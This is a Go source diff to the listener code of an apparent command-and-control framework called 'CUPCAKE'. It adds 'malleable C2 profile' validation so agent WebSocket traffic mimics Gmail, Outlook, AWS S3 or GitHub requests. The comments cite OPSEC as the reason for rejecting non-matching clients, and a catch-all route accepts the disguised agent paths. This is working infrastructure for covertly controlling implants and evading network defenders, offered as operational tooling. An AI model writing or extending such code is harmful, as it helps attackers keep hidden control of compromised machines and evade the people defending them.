@@ -9,11 +9,59 @@ import (
 	"fmt"
 	"log"
 	"net/http"
+	"os"
 	"strings"
 	"time"
 
+	"github.com/gorilla/websocket"
 	"github.com/miekg/dns"
 )
+
+// profileMatchesRequest soft-validates malleable C2 profile markers on the HTTP upgrade.
+// Empty profile → always OK. Used for OPSEC (drop non-profile clients when strict).
+func profileMatchesRequest(r *http.Request, profile string) bool {
+	p := strings.ToLower(strings.TrimSpace(profile))
+	if p == "" || p == "default" || p == "any" {
+		return true
+	}
+	ua := r.Header.Get("User-Agent")
+	path := r.URL.Path
+	switch p {
+	case "gmail":
+		if !strings.Contains(ua, "Chrome/") {
+			return false
+		}
+		if r.Header.Get("X-Gmail-Travel") == "" && !strings.Contains(path, "/mail/") {
+			return false
+		}
+		return true
+	case "outlook":
+		if r.Header.Get("X-OWA-Version") == "" && !strings.Contains(path, "/owa/") {
+			return false
+		}
+		return true
+	case "aws", "s3", "aws-s3":
+		if r.Header.Get("X-Amz-Content-SHA256") == "" && !strings.Contains(ua, "aws-sdk") {
+			return false
+		}
+		return true
+	case "github":
+		if r.Header.Get("X-GitHub-Api-Version") == "" && !strings.Contains(ua, "GitHub") {
+			return false
+		}
+		return true
+	default:
+		return true
+	}
+}
+
+func profileStrictEnabled(ln *globals.Listener) bool {
+	if ln != nil && ln.ProfileStrict {
+		return true
+	}
+	v := os.Getenv("CUPCAKE_PROFILE_STRICT")
+	return v == "1" || v == "true"
+}
 
 func RestoreListeners() {
 	time.Sleep(1 * time.Second) // Wait for DB init
@@ -35,6 +83,8 @@ func RestoreListeners() {
 			EncryptionSalt:    l.EncryptionSalt,
 			ObfuscateMode:     l.ObfuscateMode,
 			CustomPath:        l.CustomPath,
+			Profile:           l.Profile,
+			ProfileStrict:     l.ProfileStrict,
 			NSDomain:          l.NSDomain,
 			PublicDNS:         l.PublicDNS,
 			HeartbeatInterval: l.HeartbeatInterval,
@@ -62,15 +112,46 @@ func RestoreListeners() {
 func StartListenerInstance(ln *globals.Listener) error {
 	if ln.Protocol == "WebSocket" {
 		mux := http.NewServeMux()
-		path := ln.CustomPath
-		if path == "" || !strings.HasPrefix(path, "/") {
-			path = "/ws"
+		// Preferred path from listener config (documentation / health checks)
+		prefPath := ln.CustomPath
+		if prefPath == "" || !strings.HasPrefix(prefPath, "/") {
+			prefPath = "/ws"
 		}
-		mux.HandleFunc(path, func(w http.ResponseWriter, r *http.Request) {
+		wsHandler := func(w http.ResponseWriter, r *http.Request) {
+			// Only upgrade real WebSocket handshakes (malleable profiles may use any path)
+			if !websocket.IsWebSocketUpgrade(r) {
+				http.NotFound(w, r)
+				return
+			}
+			// M-014: optional profile header/path validation
+			if ln.Profile != "" && !profileMatchesRequest(r, ln.Profile) {
+				if profileStrictEnabled(ln) {
+					log.Printf("[Profile] REJECT path=%s ua=%q profile=%s from %s",
+						r.URL.Path, r.Header.Get("User-Agent"), ln.Profile, r.RemoteAddr)
+					http.Error(w, "forbidden", http.StatusForbidden)
+					return
+				}
+				log.Printf("[Profile] WARN mismatch path=%s profile=%s from %s (set profile_strict or CUPCAKE_PROFILE_STRICT=1 to reject)",
+					r.URL.Path, ln.Profile, r.RemoteAddr)
+			}
 			conn, err := globals.Upgrader.Upgrade(w, r, nil)
-			if err != nil { return }
-			go ProcessWebSocket(conn, r.RemoteAddr, ln)
-		})
+			if err != nil {
+				return
+			}
+			go func(c *websocket.Conn, addr string, l *globals.Listener) {
+				defer func() {
+					if r := recover(); r != nil {
+						log.Printf("[WS] outer panic recovered from %s: %v", addr, r)
+					}
+				}()
+				ProcessWebSocket(c, addr, l)
+			}(conn, r.RemoteAddr, ln)
+		}
+		mux.HandleFunc(prefPath, wsHandler)
+		// Catch-all: agents apply profile uri_template (gmail/outlook/…) so path ≠ /ws
+		if prefPath != "/" {
+			mux.HandleFunc("/", wsHandler)
+		}
 		ln.HTTPServer = &http.Server{
 			Addr:    fmt.Sprintf("%s:%d", ln.BindIP, ln.Port),
 			Handler: mux,
